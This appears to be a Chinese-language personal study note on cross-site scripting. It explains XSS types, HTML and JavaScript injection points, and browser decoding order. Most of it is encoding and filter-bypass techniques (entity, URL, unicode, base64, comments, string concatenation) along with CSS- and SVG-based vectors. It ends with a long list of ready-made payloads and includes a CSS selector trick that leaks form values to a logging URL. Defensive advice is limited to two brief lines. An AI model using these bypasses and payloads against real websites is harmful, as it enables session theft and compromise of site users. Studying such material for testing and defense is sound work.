### 基本原理

#### 简介

> XSS在我看来是较为简单的漏洞，这是因为：一.它涉及的语言少，核心是Javascript，需要了解HTML、CSS（有时需了解不同浏览器的特性），后端语言和框架则不用在意，只需要关注其防护方式即可；二.类型少，只有反射性、存储型和DOM型三种；三.防御起来较为简单，只要注意对所有输出采用HTML实体编码，基本上很难产生XSS漏洞。
> 
> 虽然XSS较为简单，但其攻击方式的多样，使得其危害不小，以前听闻很多厂商都不收XSS的洞，这是我不敢苟同的。
> 
> 这里关于XSS的三种类型，之来区分一下反射型和DOM。有人说大多数DOM属于反射型，反射型很直观的特点是，在存在漏洞的地方写入JavaScript脚本后，脚本经过后端不严格的过滤又回到前端执行，对于攻击者来说，他需要构造好一个URL给被攻击者。而DOM型与此极其类似，不同的是，DOM型写的Javascript攻击脚本不会被发送到后端，因为有些场景是前端的JavaScript对输入进行操作（要非常注意innerHTML），而无需发送到后端，这个时候，如果处理输入的JavaScript没有进行严格过滤，攻击者同样可以构造恶意脚本。

#### XSS与CSRF

> XSS和CSRF有一些类似的地方，XSS的反射型和DOM漏洞都依赖于被害人点击攻击者精心构造的链接，CSRF也是这样，不同的是CSRF攻击的方式更为直接了，它无需构造什么Javascript攻击脚本，它构造的链接是目标网站本就有的功能，例如删除某一篇文章，当被害人点击这个url且浏览器本地有尚未过期的cookie时，攻击就完成了。检查CSRF是否存在的方式也很简单，只需要看referer字段是否存在并有效即可，另外，网站为了防御CSRF的攻击，也经常采用提示跳转页的方式。

### 攻击

#### 攻击的两大方式

##### 构造标签内属性

```javascript
<input type="keyword" value="attack">
```

> 假设我们在某处的输入会放在上面的value中，此时，我们可以通过构造类似下面的啊脚本完成攻击

```javascript
// 我们输入了"onclick=alert()"，闭合前面属性的值，然后后面添加了一个可以执行JavaScript脚本的属性
// 这里的onclick可以替换成许多响应事件的函数
<input type="keyword" value=""onclick=alert()"">
```

##### 构造标签

```javascript
<input type="keyword" value="attack">
```

> 与上面相同的

```javascript
// "><script>alert()</scr11ipt><"是我们输入的内容
<input type="keyword" value=""><script>alert()</script><"">
```

#### 补充：有关JavaScript伪协议

> 例如onclick="myFunc()"这样的事件可以执行JavaScript，它也支持onclick="javascript:alert();"这种伪协议的写法，在浏览器打开javascript：URL的时候，它会将url当作JavaScript代码运行，当返回值不为undefined的时候，=前的属性将会被赋值为JavaScript的执行结果。
> 
> 支持JavaScript伪协议的有src、href等可以加载链接的属性，也有例如onclick、onload这样的事件

##### \<a href="" target="\_blank">中的target="\_blank"限制JavaScript伪协议的作用

target="\_blank"属性是表明按照href的链接打开一个新窗口，当href的内容为JavaScript伪协议时，其不会生效

#### 补充：编码

##### 浏览器解码顺序

> 浏览器–>`HTML解码-->URL解码-->JavaScript解码`
> 
> https://blog.csdn.net/qq_33181292/article/details/117251090

##### html实体编码

**编码方式**

* HTML实体编码有三种写法，实体名称\&lt; 十进制实体编码\&#60; 十六进制实体编码\&#x003c。HTML实体编码可以用于编辑“数据状态中的字符引用”、“属性值状态中的字符引用” 和 “RCDATA状态中的字符引用” 
* 在线编码：[在线Html实体编码解码-HTML Entity Encoding/Decoding (config.net.cn)](https://config.net.cn/tools/HtmlEncode.html)

**无关紧要分析**

* 数据状态中的字符引用：数据状态就是解析一个标签内里面的内容，如 `<div>...</div>` 中的内容
* 属性值状态中的字符引用：属性值状态中的字符引用就好理解了，就是src，href这样的属性值中的HTML实体，他也是会先进行HTML解码的，比如下面的语句，会先对里面HTML解码，然后再继续往下执行

```html
<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
```

* RCDATA状态中的字符引用:HTML中有五类元素
  
  * 空元素(Void elements)，如 `<area>`、`<br>`、`<base>` 等等。空元素不能容纳任何内容，因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间。
  
  * 原始文本元素(Raw text elements)，有 `<script>` 和 `<style>`。原始文本元素可以容纳文本。
  
  * RCDATA元素(RCDATA elements)，有 `<textarea>` 和 `<title>`。RCDATA元素可以容纳文本和字符引用。

> 注意到注意到RCDATA元素中有\<textarea\> 和 \<title\> 两个属性并且有字符引用，也就是当实体字符出现在这两个标签里面的时候，实体字符会被识别并进行HTML编码解析。这里要再提醒一次，在解析这些字符引用的过程中不会进入“标签开始状态”，所以就不会建立新的标签，所以下面这个语句触发不了XSS，这涉及到了RCDATA的一个特殊的情况。即在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。在这个状态中，如果遇到“<”字符，它会转换到“RCDATA小于号状态”。如果“<”字符后没有紧跟着“/”和对应的标签名，解析器会转换回“RCDATA状态”，并不会进入“标签开始状态”的。**这意味着在RCDATA元素标签的内容中，唯一能够被解析器认做是标签的就只有 \</textarea\> 或者 \</title\>**，因此，在 <textarea> 和 <title> 的内容中不会创建标签，就不会有脚本能够执行了。另外，刚刚也谈到了，**`<script>` 和 `<style>`是原始文本元素，在这两个标签内部的内容只有文本，因此，html实体编码在这里无效**。

![image-20230906170541489](.\images\image-20230906170541489.png)

![image-20230906170634555](.\images\image-20230906170634555.png)

![image-20230906170658759](.\images\image-20230906170658759.png)

​    仅有\<p\>...\</p\>内的JavaScript执行

**总结**

* **属性值**可以采用html实体编码，这就意味着`onclick`等执行函数的属性和`href`等支持JavaScript伪协议的属性可以通过html实体编码绕过检测
* `<svg>`内的`<script>`内的JavaScript脚本可以使用html实体编码
* 实体编码不一定需要分号

```html
<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>test</a>
<p onclick=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x78;&#x73;&#x73;&#x22;&#x29;>ppp</p>
<svg><script>&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x002f;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x7f16;&#x7801;&#x002f;&#x0029;&#x003b;</script></svg>
```

##### url编码

* JavaScript伪协议有效

```html
<p>
    <!-- JavaScript无效 -->
	3号:<a href="javasc%72ipt:alert(1)">javascript中的r进行编码</a>
</p>
<p>
    <!-- 有效 -->
	4号:<a href="javascript:ale%72t(1)">alert(1)中的r进行编码</a>
</p>
<p>
    <!-- 有效 -->
	5号:<a href="javascript:alert%281)">alert(1)中的'('进行编码</a>
</p>
<!-- JavaScript无效 -->
<img src=# onclick="alert%281)"/>
<!-- JavaScript无效 -->
<img src=# onclick="javascript:alert%281)"/>
<!-- JavaScript无效 -->
<img src=# onclick="ale%72t(1)"/>
```



##### unicode编码

* 可以对属性值进行unicode编码，不能对`javascript:`和控制字符编码

```html
<p>
	<!-- JavaScript无效 -->
    3号:<a href="javasc\u0072ipt:alert(1)">javascript中的r进行编码</a>
</p>
<p>
     <!-- 有效 -->
    4号:<a href="javascript:ale\u0072t(1)">alert(1)中的r进行编码</a>
</p>
<p>
    <!-- JavaScript无效 -->
    5号:<a href="javascript:alert\u00281)">alert(1)中的(进行编码</a>
</p>
<!-- JavaScript无效 -->
<p onclick="alert\u00281")>onclick</p>
<!-- 有效 -->
<p onclick="javascript:ale\u0072t(1)")>onclick</p>
<!-- 有效 -->
<p onclick="ale\u0072t(1)")>onclick</p>
```



##### base64编码

```javascript
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<!--base64加密：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg 解码：<script>alert(1)</script>-->
<a href="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">test</a>
<!-- cPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg== -->
<iframe src="data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></iframe>
```

##### 多层编码

见链接

#### 补充：注释

```html
<!--这是单行注释-->
<!--
    这是多行注释
    这是多行注释
    这是多行注释
-->
```

```css
/*这是单行注释*/

/*
    这是多行注释
    这是多行注释
    这是多行注释
*/
```

```javascript
//这是单行注释
/*
    这是多行注释
    这是多行注释
    这是多行注释
*/

// 这里输入了</address> <img src=# onerror=alert(1)//，起到了闭合前文引号的同时注释后面的引号
<img src="</address> <img src=# onerror=alert(1)//">
```

> 注释的使用：html注释常常用来闭合标签；JavaScript的注释可以在在一些不和闭合引号的地方将其注释

#### 过滤和绕过

##### 关键字过滤

* 大小写绕过
* 双写绕过
* 编码绕过
* 回车、tab、空格、注释、括号等分割引号或者script标签内的**JavaScript语句**

```javascript
/*添加空格、TAB、回车、换行：*/alert%20(/xss/)、alert%0A(/xss/)、alert%0D(/xss/)、alert%09(/xss/)
/*添加多行注释：*/alert/*abcd*/(/xss/)
/*添加注释换行：*/alert//abcd%0A(/xss/)、confirm//abcd%0D(/xss/)
/*使用''代替()：*/alert'xss'
/*使用括号分割：*/(alert)(/xss/)、((alert))(/xss/)
```

注意分割的地方，直接将一个关键字aler%20t分开是不行的，空格符分割涉及到JavaScript的**no LineTerminator here**规则和自动插入分号规则。

##### 关键字变形

* 大小写
* 编码

##### 特殊符号过滤

> 全过滤了肯定无法绕过，针对过滤不完全的情况则有很多方法，主要是有很多字符可以作为替换方案

* 过滤了引号：html可以不用引号；JavaScript可以用反引号
* 过滤了&符号阻止编码：可以使用其他编码
* 过滤了括号：有些JavaScript函数后可以不加括号，或者用 //分割
* 对url进行过滤
  * 过滤http：可以直接用\\\\代替http:\\\
  * 过滤 . :可以用。代替，有些浏览器会自动优化中文句号
* 过滤了空格
  * 使用其他空白字符代替 %0d %0a

##### 将特殊字符转化为HTML实体

* 以php为例，默认的htmlspecialchars()不过滤单引号，因此使用htmlspecialchars()时需注意合理设置
* 有的场景下，前端输入的返回是在script标签或则JavaScript伪协议内，这时htmlspecialchars()完全无效

##### 利用函数

* 这里利用一些函数就可以使用字符串拼接成JavaScript关键字和函数进行

```javascript
// window.alert("hello world")
window["ale" + "rt"]("Hello, World!");

eval("wind" + "ow.alert('Hello, World!');");

var obj = { ale: { rt: function(msg) { alert(msg); } } };
obj["ale"]["rt"]("Hello, World!");

document.write('<script>alert(document.cookie)<\/script>')
```

#### 利用CSS进行XSS

```css
/* 利用CSS中的 expression() url() regex() 等函数或特性来引入外部的恶意代码 */
/*  很多浏览器都禁用了，貌似仅IE支持 */
/*  */
<div style="background-im-age:url(javascript:alert('xss'))">
<div style="width:exp/*这里可以注释*/ression(alert('xss'));">

/* 产生的新的攻击方式 */
<style>
    #form2 input[value^='a'] { background-image: url(http://localhost/log.php/a); }
    #form2 input[value^='b'] { background-image: url(http://localhost/log.php/b); }
    #form2 input[value^='c'] { background-image: url(http://localhost/log.php/c); }
    [...]
</style>
<form action="http://example.com" id="form2">
    <input type="text" id="secret" name="secret" value="abc">
</form>
```

#### 与SVG有关的XSS

##### SVG标签结合html实体编码绕过

```html
<svg><script>&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x0028;&#x002f;&#x0061;&#x006c;&#x0065;&#x0072;&#x0074;&#x7f16;&#x7801;&#x002f;&#x0029;&#x003b;</script></svg>
```

* 此时\<script\>内的JavaScript支持html实体编码

##### 利用svg文件上传进行XSS

> 代码中的SVG标签和onload事件本身并不依赖于其他特定的标签来触发弹窗。无论它们被放置在哪个标签内，只要浏览器解析并加载了这个SVG标签，onload事件就会被触发。
> 
> SVG标签通常是在HTML文档中嵌入使用的，并且可以放置在许多不同的HTML标签内。具体取决于网页的结构和用途。以下是一些常见的情况：

```html
<body>
  <svg onload="alert(document.domain)">
    <!-- SVG内容 -->
  </svg>
</body>

<div>
  <svg onload="alert(document.domain)">
    <!-- SVG内容 -->
  </svg>
</div>

<img src="data:image/svg+xml,<svg onload='alert(document.domain)'>">

<svg id="rectangle" xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink"
width="100" height="100">
<a xlink:href="javascript:alert(location)">
<rect x="0" y="0" width="100" height="100" />
</a>
</svg>
```

[用SVG绕过浏览器XSS审计 - r00tgrok - 博客园 (cnblogs.com)](https://www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html)

### 利用

#### 基本方式

> XSS产生在于后端没有对输入的数据进行检查既返回前端，攻击者可构造script脚本进行提交。当使用GET方法提交数据时，可以直接构造型如url?query=<script>给被害人；当使用POST方法提交数据时，则需要我们在自己的服务器上构造一个恶意页面，使用表单的方式提交数据，注意此处我们写入的恶意脚本在哪，我们的恶意脚本并不是在在我们的恶意界面起作用，因为恶意界面由于同源策略等浏览器安全策略，是获得不了被害人在目标站点的cookie的，我们的恶意脚本是作为输入提交到了目标站点。

### 防御

* HttpOnly
* 在响应报文的header中配置X-XSS-Protection

### 附常用payload

```html
<a href="javascript:alert(1)">test</a>
<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
<a href="x" onclick=eval("alert('xss');")>xss</a>
<a href="x" onmouseover="alert('xss');">xss</a>
<a href="x" onmouseout="alert('xss');">xss</a>

<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">

<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">

<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">

<svg onload=javascript:alert(1)>
<svg onload="alert('xss');"></svg>

<button onclick=alert(1)>
<button onfocus="alert('xss');" autofocus="">xss</button>
<button onclick="alert('xss');">xss</button>
<button onmouseover="alert('xss');">xss</button>
<button onmouseout="alert('xss');">xss</button>
<button onmouseup="alert('xss');">xss</button>
<button onmousedown="alert('xss');"></button>

<div onmouseover='alert(1)'>DIV</div>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>

<script>alert('xss')</script>
<script>alert(/xss/)</script>
<script>alert(123)</script>

<p onclick="alert('xss');">xss</p>
<p onmouseover="alert('xss');">xss</p>
<p onmouseout="alert('xss');">xss</p>
<p onmouseup="alert('xss');">xss</p>

<input onclick="alert('xss');">
<input onfocus="alert('xss');">
<input onfocus="alert('xss');" autofocus="">
<input onmouseover="alert('xss');">
<input type="text" onkeydown="alert('xss');"></input>
<input type="text" onkeypress="alert('xss');"></input>
<input type="text" onkeydown="alert('xss');"></input>

<details ontoggle="alert('xss');"></details>
<details ontoggle="alert('xss');" open=""></details>

<select onfocus="alert('xss');" autofocus></select>
<select onmouseover="alert('xss');"></select>
<select onclick=eval("alert('xss');")></select>

<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
<form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form>
<form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>

<body onload="alert('xss');"></body>

<!-- css相关的xss -->
<div style="background-image:url('http://127.0.0.1/xss.gif')"></div>
<style>body {background: url('http://127.0.0.1/xss.gif')}</style>
<!-- expression()表达式在IE7及以下是有效的，在IE8及以上就失效了 -->
<div style="{left: expression(alert('xss'))}"></div>
<!-- 利用 @import 引入外部 js -->
<!-- 被引用的css body {event: expression (onload = function() {alert('XSS');})} -->
<style type="text/css">@import url(http://www.xx.css)</style>
<!-- 还可以利用 @import 直接执行 XSS 代码 -->
<style>@import "javascript:alert('xss')";</style>
```

* 整理补充

```html
<button formaction=javascript:alert(1)></button><!-- 试验过，单独无法触发xss，需配合input标签？ -->


<!-- <frame> <object>等多重嵌套，iframe内即为<object> -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
<iframe
src="data:text/html;base64PG9iamVjdCBkYXRhPSJkYXRhOnRleHQvaHRtbDtiYXNlNjQsUEhOamNtbHdkRDVoYkdWeWRDZ3ZlSE56THlrOEwzTmpjbWx3ZEQ0PSI+PC9vYmplY3Q+=="
></iframe>
```